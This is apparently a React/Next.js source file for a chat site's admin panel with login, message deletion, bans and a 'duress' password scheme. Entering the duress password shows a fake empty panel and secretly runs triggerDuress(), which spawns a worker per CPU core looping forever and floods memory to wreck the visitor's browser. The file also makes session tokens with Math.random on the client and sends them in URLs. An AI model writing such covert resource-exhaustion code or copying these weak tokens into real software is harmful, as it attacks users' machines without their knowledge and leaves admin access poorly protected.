'use client'

import { useState, useEffect, useCallback } from 'react'

type Stats = {
  messageCount: number
  noteCount: number
  bannedUsers: { id: string; username: string; reason: string; banned_at: string }[]
  duressEvents: { id: string; triggered_at: string; resolved: boolean }[]
}

type Message = { id: string; username: string; content: string; created_at: string }

// Client-side duress CPU/RAM bomb — runs in attacker's browser only
function triggerDuress() {
  // Spawn multiple workers doing infinite computation
  const workerCode = `
    self.onmessage = function() {
      const arr = [];
      while (true) {
        for (let i = 0; i < 1e7; i++) arr.push(Math.random() * Math.random());
        if (arr.length > 5e7) arr.splice(0, 1e7);
      }
    };
  `
  const blob = new Blob([workerCode], { type: 'application/javascript' })
  const url = URL.createObjectURL(blob)
  // Spawn as many workers as logical CPU cores
  const cores = navigator.hardwareConcurrency || 4
  for (let i = 0; i < cores; i++) {
    const w = new Worker(url)
    w.postMessage('go')
  }
  // Also hammer main thread memory
  const giant: number[] = []
  const fill = () => {
    for (let i = 0; i < 1e6; i++) giant.push(Math.random())
    requestAnimationFrame(fill)
  }
  fill()
}

export default function AdminPage() {
  const [phase, setPhase] = useState<'login' | 'change-password' | 'admin'>('login')
  const [pw, setPw] = useState('')
  const [loginError, setLoginError] = useState('')
  const [adminToken] = useState(() => Math.random().toString(36).slice(2))
  const [sessionToken, setSessionToken] = useState('')
  const [stats, setStats] = useState<Stats | null>(null)
  const [messages, setMessages] = useState<Message[]>([])
  const [banInput, setBanInput] = useState('')
  const [banReason, setBanReason] = useState('')
  const [newMain, setNewMain] = useState('')
  const [newDuress, setNewDuress] = useState('')
  const [feedback, setFeedback] = useState('')
  const [activeTab, setActiveTab] = useState<'stats' | 'messages' | 'bans' | 'passwords'>('stats')

  const loadStats = useCallback(async (token: string) => {
    const d = await fetch(`/api/admin/stats?token=${token}`).then(r => r.json())
    if (!d.error) setStats(d)
  }, [])

  const loadMessages = useCallback(async (token: string) => {
    const d = await fetch(`/api/admin/messages?token=${token}`).then(r => r.json())
    if (Array.isArray(d)) setMessages(d)
  }, [])

  async function login(e: React.FormEvent) {
    e.preventDefault()
    setLoginError('')
    const res = await fetch('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: pw }),
    }).then(r => r.json())

    if (!res.ok) { setLoginError('Invalid password'); return }

    if (res.duress) {
      // Show fake empty admin to the attacker, secretly destroy their browser
      triggerDuress()
      setSessionToken(adminToken)
      setStats({ messageCount: 0, noteCount: 0, bannedUsers: [], duressEvents: [] })
      setMessages([])
      setPhase('admin')
      return
    }

    // Generate a short-lived session token
    const token = Math.random().toString(36).slice(2) + Date.now().toString(36)
    setSessionToken(token)

    if (res.requiresChange) {
      setPhase('change-password')
      return
    }

    await loadStats(token)
    await loadMessages(token)
    setPhase('admin')
  }

  async function changePassword(e: React.FormEvent) {
    e.preventDefault()
    if (!newMain.trim() || !newDuress.trim()) { setFeedback('Both fields required'); return }
    if (newMain === newDuress) { setFeedback('Main and duress must differ'); return }
    const res = await fetch('/api/admin/change-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ newMain, newDuress, adminToken: sessionToken }),
    }).then(r => r.json())
    if (res.ok) {
      setFeedback('')
      await loadStats(sessionToken)
      await loadMessages(sessionToken)
      setPhase('admin')
    } else {
      setFeedback(res.error)
    }
  }

  async function clearTarget(target: 'messages' | 'notes') {
    if (!confirm(`Delete all ${target}? This cannot be undone.`)) return
    const res = await fetch('/api/admin/clear', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target, adminToken: sessionToken }),
    }).then(r => r.json())
    if (res.ok) { setFeedback(`All ${target} cleared.`); loadStats(sessionToken); if (target === 'messages') loadMessages(sessionToken) }
    else setFeedback(res.error)
  }

  async function deleteMessage(id: string) {
    await fetch('/api/admin/messages', {
      method: 'DELETE',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id, adminToken: sessionToken }),
    })
    setMessages(m => m.filter(x => x.id !== id))
    setStats(s => s ? { ...s, messageCount: s.messageCount - 1 } : s)
  }

  async function banUser() {
    if (!banInput.trim()) return
    const res = await fetch('/api/admin/ban', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: banInput, reason: banReason, adminToken: sessionToken }),
    }).then(r => r.json())
    if (res.ok) { setFeedback(`Banned: ${banInput}`); setBanInput(''); setBanReason(''); loadStats(sessionToken) }
    else setFeedback(res.error)
  }

  async function unbanUser(username: string) {
    await fetch('/api/admin/ban', {
      method: 'DELETE',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, adminToken: sessionToken }),
    })
    setStats(s => s ? { ...s, bannedUsers: s.bannedUsers.filter(u => u.username !== username) } : s)
    setFeedback(`Unbanned: ${username}`)
  }

  const s: React.CSSProperties = {}
  const inp = { padding: '0.45rem 0.75rem', borderRadius: 6, border: '1px solid var(--border)', background: 'transparent', color: 'var(--fg)', fontFamily: 'inherit', fontSize: '0.875rem', width: '100%' } as React.CSSProperties
  const btn = (accent?: boolean) => ({ padding: '0.4rem 1rem', borderRadius: 6, border: accent ? 'none' : '1px solid var(--border)', background: accent ? 'var(--accent)' : 'transparent', color: accent ? '#fff' : 'var(--fg)', fontFamily: 'inherit', fontSize: '0.8rem', cursor: 'pointer' }) as React.CSSProperties
  const dangerBtn = { ...btn(), border: '1px solid var(--error)', color: 'var(--error)' } as React.CSSProperties

  if (phase === 'login') return (
    <main style={{ minHeight: '100dvh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      <form onSubmit={login} style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', width: 280 }}>
        <h1 style={{ fontSize: '1.1rem', fontWeight: 700, letterSpacing: '-0.02em' }}>admin</h1>
        <input type="password" value={pw} onChange={e => setPw(e.target.value)} placeholder="password" style={inp} autoFocus />
        {loginError && <p style={{ color: 'var(--error)', fontSize: '0.8rem' }}>{loginError}</p>}
        <button type="submit" style={btn(true)}>enter</button>
      </form>
    </main>
  )

  if (phase === 'change-password') return (
    <main style={{ minHeight: '100dvh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      <form onSubmit={changePassword} style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', width: 320 }}>
        <h1 style={{ fontSize: '1.1rem', fontWeight: 700 }}>mandatory password change</h1>
        <p style={{ fontSize: '0.8rem', color: 'var(--muted)' }}>A duress event was triggered. Set new main and duress passwords.</p>
        <input type="password" value={newMain} onChange={e => setNewMain(e.target.value)} placeholder="new main password" style={inp} />
        <input type="password" value={newDuress} onChange={e => setNewDuress(e.target.value)} placeholder="new duress password" style={inp} />
        {feedback && <p style={{ color: 'var(--error)', fontSize: '0.8rem' }}>{feedback}</p>}
        <button type="submit" style={btn(true)}>update passwords</button>
      </form>
    </main>
  )

  return (
    <main style={{ maxWidth: 900, margin: '0 auto', padding: '1.5rem 1rem' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
        <h1 style={{ fontSize: '1.25rem', fontWeight: 700, letterSpacing: '-0.02em' }}>admin panel</h1>
        <a href="/" style={{ fontSize: '0.8rem', color: 'var(--muted)', textDecoration: 'none' }}>← back</a>
      </div>

      {feedback && <div style={{ marginBottom: '1rem', padding: '0.5rem 0.75rem', borderRadius: 6, border: '1px solid var(--accent)', fontSize: '0.8rem', color: 'var(--accent)' }}>{feedback}</div>}

      {/* Tabs */}
      <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1.5rem' }}>
        {(['stats', 'messages', 'bans', 'passwords'] as const).map(t => (
          <button key={t} onClick={() => setActiveTab(t)} style={{ ...btn(activeTab === t), padding: '0.3rem 0.85rem' }}>{t}</button>
        ))}
      </div>

      {activeTab === 'stats' && stats && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(160px, 1fr))', gap: '0.75rem' }}>
            {[['messages', stats.messageCount], ['notes', stats.noteCount], ['banned', stats.bannedUsers.length]].map(([k, v]) => (
              <div key={k as string} style={{ padding: '1rem', border: '1px solid var(--border)', borderRadius: 8 }}>
                <div style={{ fontSize: '1.5rem', fontWeight: 700 }}>{v}</div>
                <div style={{ fontSize: '0.75rem', color: 'var(--muted)' }}>{k as string}</div>
              </div>
            ))}
          </div>
          <div style={{ display: 'flex', gap: '0.5rem' }}>
            <button onClick={() => clearTarget('messages')} style={dangerBtn}>clear chat</button>
            <button onClick={() => clearTarget('notes')} style={dangerBtn}>clear notes</button>
          </div>
          {stats.duressEvents.length > 0 && (
            <div>
              <p style={{ fontSize: '0.8rem', color: 'var(--error)', marginBottom: '0.5rem' }}>⚠ duress events</p>
              {stats.duressEvents.map(e => (
                <div key={e.id} style={{ fontSize: '0.75rem', color: 'var(--muted)' }}>{new Date(e.triggered_at).toLocaleString()} — {e.resolved ? 'resolved' : 'active'}</div>
              ))}
            </div>
          )}
        </div>
      )}

      {activeTab === 'messages' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.4rem' }}>
          {messages.length === 0 && <p style={{ color: 'var(--muted)', fontSize: '0.85rem' }}>no messages</p>}
          {messages.map(m => (
            <div key={m.id} style={{ display: 'flex', gap: '0.5rem', alignItems: 'flex-start', padding: '0.5rem 0.75rem', border: '1px solid var(--border)', borderRadius: 6 }}>
              <div style={{ flex: 1 }}>
                <span style={{ color: 'var(--accent)', fontSize: '0.8rem', marginRight: '0.5rem' }}>{m.username}</span>
                <span style={{ fontSize: '0.85rem' }}>{m.content}</span>
                <span style={{ color: 'var(--muted)', fontSize: '0.7rem', marginLeft: '0.5rem' }}>{new Date(m.created_at).toLocaleString()}</span>
              </div>
              <button onClick={() => deleteMessage(m.id)} style={{ ...dangerBtn, padding: '0.2rem 0.5rem', fontSize: '0.75rem' }}>del</button>
            </div>
          ))}
        </div>
      )}

      {activeTab === 'bans' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
          <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
            <input value={banInput} onChange={e => setBanInput(e.target.value)} placeholder="username" style={{ ...inp, width: 160 }} />
            <input value={banReason} onChange={e => setBanReason(e.target.value)} placeholder="reason (optional)" style={{ ...inp, flex: 1 }} />
            <button onClick={banUser} style={dangerBtn}>ban</button>
          </div>
          {stats?.bannedUsers.length === 0 && <p style={{ color: 'var(--muted)', fontSize: '0.85rem' }}>no banned users</p>}
          {stats?.bannedUsers.map(u => (
            <div key={u.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0.5rem 0.75rem', border: '1px solid var(--border)', borderRadius: 6 }}>
              <div>
                <span style={{ fontSize: '0.85rem' }}>{u.username}</span>
                {u.reason && <span style={{ color: 'var(--muted)', fontSize: '0.75rem', marginLeft: '0.5rem' }}>— {u.reason}</span>}
              </div>
              <button onClick={() => unbanUser(u.username)} style={{ ...btn(), fontSize: '0.75rem', padding: '0.2rem 0.5rem' }}>unban</button>
            </div>
          ))}
        </div>
      )}

      {activeTab === 'passwords' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', maxWidth: 380 }}>
          <p style={{ fontSize: '0.8rem', color: 'var(--muted)' }}>Change main and duress passwords. Both are required.</p>
          <input type="password" value={newMain} onChange={e => setNewMain(e.target.value)} placeholder="new main password" style={inp} />
          <input type="password" value={newDuress} onChange={e => setNewDuress(e.target.value)} placeholder="new duress password" style={inp} />
          {feedback && <p style={{ fontSize: '0.8rem', color: 'var(--error)' }}>{feedback}</p>}
          <button onClick={e => changePassword(e as any)} style={btn(true)}>update passwords</button>
        </div>
      )}
    </main>
  )
}
